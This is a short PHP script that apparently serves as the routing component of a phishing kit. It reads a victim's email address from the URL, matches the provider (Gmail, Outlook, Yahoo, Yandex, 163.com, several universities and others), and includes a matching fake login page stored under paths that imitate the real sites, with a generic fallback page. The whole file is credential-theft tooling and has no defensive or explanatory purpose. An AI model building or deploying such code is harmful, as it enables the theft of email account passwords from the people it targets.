<?php
  $url = $_GET['email'];

  $redirects = array(
    'gmail' => 'accounts.google.com/ServiceLogin.php',
    'hotmail' => 'outlook.live.com/index.php',
	'live' => 'outlook.live.com/index.php',
	'mweb' => 'mail.mweb.co.za/login.php',
	'iafrica' => 'mail.mweb.co.za/login.php',
	'telkomsa' => 'webmail.telkomsa.net/mail.php',
	
	'aol' => 'aol/login.php',
	'boun' => 'boun/login.php',
	'bracu' => 'bracu/bracu.php',
	'comcast' => 'comcast/login.php',
	
	'daum' => 'daum/login.php',
	'enerprwebmail' => 'enerprwebmail/login.php',
	'essen' => 'essen/login.php',
	'account' => 'excel/login.php',
	'yandex' => 'yandex/login.php',
	
	'yeah' => 'yandex/loginy.php',
	'rediff' => 'rediffmail/login.php',
	'vip163' => 'vip163/login.php',
	'tonline' => 'tonline/login.php',
	'vub' => 'vub/login.php',
	'ulb' => 'vub/login.php',
	
	'csail' => 'hordcsail/login.php',
	'hushmail' => 'hushmail/login.php',
	'iitb' => 'iitb/login.php',
	'ktr' => 'ktr/login.php',
	
	
	'163.com' => 'email.163.com/login.php',
	'126.com' => 'email.163.com/login.php',
	'yeah' => 'email.163.com/login.php',
	'shouji' => 'email.163.com/login.php',
	
    'webmail' => 'webmail/index.php', // Alternatives: novel also directs to book.
    'yahoo' => 'login.yahoo.com/login.php');
	

  

  $wordFound = false;

  // Loop through all words
  foreach($redirects as $word => $file) {

    // If a word exists in the url, include that file.
    if (strpos($url,$word) !== false) {

      // `file_get_contents` would just echo the code in the file rather 
      // than execute it, so did you mean `include` instead? Or a real 
      // redirect using header('Location: xyz.php');?

      include($file);

      $wordFound = true;
      break;
    }
  }

  // If no words were found, include the other file
  if ($wordFound == false) {
    include("webmail-2096/gen.php");
  }

?>
